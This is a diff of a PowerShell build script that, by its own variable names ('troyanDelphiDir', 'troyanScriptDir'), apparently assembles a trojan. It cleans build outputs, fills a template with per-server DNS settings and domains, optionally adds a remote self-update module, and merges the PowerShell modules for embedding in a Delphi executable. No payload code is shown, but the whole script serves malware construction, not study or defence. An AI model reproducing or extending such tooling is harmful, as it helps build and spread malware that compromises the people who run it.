@@ -9,12 +9,26 @@ $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 
 Write-Host "preCompile"
 
+if (Test-Path -Path $server.troyanDelphiScript) {
+    Remove-Item -Path $server.troyanDelphiScript
+}
+if (Test-Path -Path $server.userDelphiExe)
+{
+    Remove-Item -Path $server.userDelphiExe
+}
+
+$extensions = @(".dcu", ".res", ".exe",".~pas","*.~dpr")
+foreach ($ext in $extensions) {
+    Get-ChildItem -Path $server.troyanDelphiDir -Filter "*$ext" | Remove-Item -Force
+}
+Get-ChildItem -Path $server.troyanDelphiDir -Filter "_*" | Remove-Item -Force
+
+
 
 #certs
 $template = @"
 `$PrimaryDNSServer = '1.1.1.1'
 `$SecondaryDNSServer = '2.2.2.2'
-`$autoUpdate = '_autoUpdate'
 `$updateUrl = '_updateUrl'
 `$xdata = @{
     JOPA
@@ -40,20 +54,26 @@ foreach ($domain in $server.domains) {
 $listString = $stringList -join [System.Environment]::NewLine
 $template = $template -replace "1\.1\.1\.1", $server.primaryDns
 $template = $template -replace "2\.2\.2\.2", $server.secondaryDns
-$template = $template -replace "_autoUpdate", $auto
-$template = $template -replace "_updateUrl", $server.updateUrl
+if ($server.autoUpdate)
+{
+    $template = $template -replace "_updateUrl", $server.updateUrl
+}
 $template  = $template -replace "JOPA", $listString
 $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath 'consts.ps1')
 
 #join
-$destinationFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_ready.ps1"
 $ps1Files = @(
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "consts.ps1"),
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "utils.ps1"),
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "update.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" }),
-    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "update.ps1")
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "program.ps1")
 ) | ForEach-Object { $_ } | Where-Object { $_ -ne $null }
+
+if ($server.autoUpdate)
+{
+    $ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "update.ps1")
+}
+
 $joinedContent = ""
 foreach ($file in $ps1Files) {
     $fileContent = Get-Content -Path $file.FullName -Raw
@@ -62,7 +82,7 @@ foreach ($file in $ps1Files) {
     $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
     $joinedContent += $fileContent + [System.Environment]::NewLine
 }
-$joinedContent | Set-Content -Path $destinationFile -Encoding UTF8
+$joinedContent | Set-Content -Path $server.troyanDelphiScript -Encoding UTF8
 
 & (Join-Path -Path $scriptDir -ChildPath "./precompile.embeddings.ps1") -serverName $serverName   
 
